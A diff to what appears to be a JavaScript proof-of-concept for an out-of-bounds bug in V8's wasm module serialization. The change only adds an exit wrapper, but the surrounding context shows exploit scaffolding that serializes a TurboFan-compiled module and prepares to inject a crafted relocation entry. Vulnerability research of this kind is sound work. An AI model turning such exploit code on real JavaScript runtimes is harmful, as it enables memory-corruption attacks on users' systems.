@@ -63,6 +63,11 @@
 
 'use strict';
 
+// Browser/d8 portability: process.exit() is Node.js-only
+const _exit = typeof process !== 'undefined'
+  ? n => process.exit(n)
+  : n => { throw new Error('[PoC] Node.js required: node --allow-natives-syntax --no-liftoff extref_oob_poc.js'); };
+
 // ── Minimal wasm: returns i32.const 42 ────────────────────────────────────────
 // The specific instruction doesn't matter — we need TurboFan code bytes to inject
 // our crafted reloc into.  Simple constant-return functions warm quickly.
@@ -91,11 +96,11 @@ try {
   if (e instanceof SyntaxError) {
     console.error('[!] %SerializeWasmModule requires --allow-natives-syntax.');
     console.error('    Run: node --allow-natives-syntax --no-liftoff extref_oob_poc.js');
-    process.exit(1);
+    _exit(1);
   }
   throw e;
 }
-if (!blob) { console.error('[!] %SerializeWasmModule returned null'); process.exit(1); }
+if (!blob) { console.error('[!] %SerializeWasmModule returned null'); _exit(1); }
 const bv = new Uint8Array(blob);
 const dv = new DataView(blob);
 console.log('[2] Blob: ' + blob.byteLength + 'B');
@@ -128,7 +133,7 @@ console.log('[3] func0: code_kind=0x' + code_kind.toString(16) +
 if (tier !== 0x02) {
   console.log('[!] func0 is not TurboFan (tier=0x' + tier.toString(16) + ').');
   console.log('    Re-run: node --allow-natives-syntax --no-liftoff extref_oob_poc.js');
-  process.exit(0);
+  _exit(0);
 }
 
 const orig_reloc = [...bv.slice(reloc_start, reloc_start + reloc_size)]
